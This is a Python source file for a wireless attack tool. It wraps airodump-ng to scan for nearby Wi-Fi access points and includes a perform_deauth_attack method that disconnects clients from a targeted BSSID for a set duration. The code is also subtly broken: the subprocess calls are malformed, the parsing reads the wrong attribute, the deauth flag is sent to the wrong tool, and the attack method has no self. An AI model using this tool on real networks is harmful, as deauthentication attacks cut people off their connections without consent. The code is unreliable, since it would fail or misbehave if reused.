import logging
import subprocess
import re

class AirodumpScanner:
    
    @staticmethod
    def _sniff(interface):
        output = subprocess.run(f"airodump-ng {interface}",capture_output=True, text=True)
        network=list()
        for line in output.splitlines():
            
            if re.match(r"([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})", line):
                parts = line.split()
                if len(parts) >= 11: # Only fetch lines that are access points
                    network.append({
                        "bssid": parts[0],
                        "pwr": parts[1],
                        "beacons": parts[2],
                        "data": parts[3],
                        "s/s": parts[4],
                        "ch": parts[5],
                        "mb": parts[6],
                        "enc": parts[7],
                        "cipher": parts[8],
                        "auth": parts[9],
                        "essid": ' '.join(parts[10:])
                    })   
                    
        return network
    
    @staticmethod
    def get_networks_in_range(interface):
        logging.info(f"Starting airodump scan on interface {interface}...")
        # Placeholder for logic to perform airodump scanning    
        scanned_networks = AirodumpScanner._sniff(interface)
        logging.info(f"Airodump scan completed. Found {len(scanned_networks)} networks.")
        return scanned_networks
    
    
    def perform_deauth_attack(target_bssid, target_client_mac=None, attack_duration=60, interface=None)->bool:
        
        if not interface:
            logging.error("No interface specified for deauth attack.")
            raise ValueError("Interface is required for deauth attack.")
        
        try:
            logging.info(f"Initiating deauth attack on BSSID {target_bssid} for {attack_duration} seconds.")
            subprocess.run(f"timeout {attack_duration}s airodump-ng --deauth 0 -a {target_bssid} -c {target_client_mac} {interface}" , shell=False )        
            logging.info("Deauth attack is started.")         
            return True
        
        except Exception as e:
            logging.error(f"Error during deauth attack: {e}")
            raise e
